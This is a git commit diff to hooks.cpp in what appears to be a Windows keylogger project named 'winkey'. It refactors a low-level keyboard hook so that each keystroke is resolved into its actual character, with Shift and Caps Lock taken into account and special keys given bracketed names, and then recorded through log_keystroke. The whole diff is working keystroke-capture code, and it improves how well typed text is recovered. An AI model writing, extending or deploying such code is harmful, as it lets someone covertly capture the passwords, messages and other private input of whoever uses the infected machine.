cc64861673f0629d56691187a986adf6bde306b7
Stone <sdummett.dev@proton.me>
2023-12-02 14:30:07 +0000

    [Winkey]: Better key name log

--- winkey/srcs/hooks.cpp
+++ winkey/srcs/hooks.cpp
@@ -1,5 +1,52 @@
 #include "winkey.hpp"
 
+std::string get_non_alphanumeric_key(KBDLLHOOKSTRUCT* kbStruct) {
+    char key_name[256] = { 0 };
+    memset(key_name, 0, sizeof(key_name));
+    LONG dwMsg = 1;
+    dwMsg += kbStruct->scanCode << 16;
+    dwMsg += kbStruct->flags << 24;
+    if (!GetKeyNameTextA(dwMsg, key_name, sizeof(key_name) - 1)) {
+        std::cerr << "Last error: " << GetLastError() << std::endl;
+    }
+    return key_name;
+}
+
+std::string get_key_name(KBDLLHOOKSTRUCT* kbStruct) {
+    BYTE key_state[256];
+    GetKeyboardState(key_state);
+
+    // Check if Shift key is pressed
+    bool is_shift_pressed = (GetKeyState(VK_SHIFT) & 0x80) != 0;
+    // Check if Caps Lock is on
+    bool is_caps_lock_on = (GetKeyState(VK_CAPITAL) & 0x01) != 0;
+
+    // Determine the actual character
+    BYTE keyboard_state[256];
+    GetKeyboardState(keyboard_state);
+
+    WCHAR wch;
+    int result = ToUnicode(kbStruct->vkCode, kbStruct->scanCode, keyboard_state, &wch, 1, 0);
+
+    if (result > 0) {
+        // Handle uppercase/lowercase based on Shift and Caps Lock
+        WCHAR actual_char = is_shift_pressed ^ is_caps_lock_on ? towupper(wch) : towlower(wch);
+
+        char c = static_cast<char>(actual_char);
+        
+        if (c == '\a' || c == '\b' || c == '\t' || c == '\n' || c == '\v' || c == '\f' || c == '\r') {
+            //std::cout << "[" << get_non_alphanumeric_key(kbStruct) << "]" << std::endl;
+            return "[" + get_non_alphanumeric_key(kbStruct) + "]";
+        }
+        else {
+            //std::cout << "std::string: " << std::string(&c, 1) << std::endl;
+            return std::string(&c, 1);
+        }
+    }
+        //std::cout << "[" << get_non_alphanumeric_key(kbStruct) << "]" << std::endl;
+        return "[" + get_non_alphanumeric_key(kbStruct) + "]";
+}
+
 // Define the keyboard event hook 
 LRESULT CALLBACK handle_keyboard_event(
     _In_ int    nCode,
@@ -7,23 +54,9 @@ LRESULT CALLBACK handle_keyboard_event(
     _In_ LPARAM lParam
 ) {
     if (nCode >= 0) {
-        KBDLLHOOKSTRUCT* pKbStruct = (KBDLLHOOKSTRUCT*)lParam;
-        char key_name[256] = { 0 };
-
+        KBDLLHOOKSTRUCT* kb_struct = (KBDLLHOOKSTRUCT*)lParam;
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
-            // std::cout << std::hex << "Key down - Virtual Key Code: 0x" << pKbStruct->vkCode << std::dec << std::endl;
-
-            memset(key_name, 0, sizeof(key_name));
-            LONG dwMsg = 1;
-            dwMsg += pKbStruct->scanCode << 16;
-            dwMsg += pKbStruct->flags << 24;
-            if (GetKeyNameTextA(dwMsg, key_name, sizeof(key_name) - 1)) {
-                std::cout << key_name;
-                log_keystroke(key_name);
-            }
-            else {
-                std::cout << "Last error: " << GetLastError() << std::endl;
-            }
+            log_keystroke(get_key_name(kb_struct));
         }
     }
     return CallNextHookEx(g_keyboard_hook, nCode, wParam, lParam);
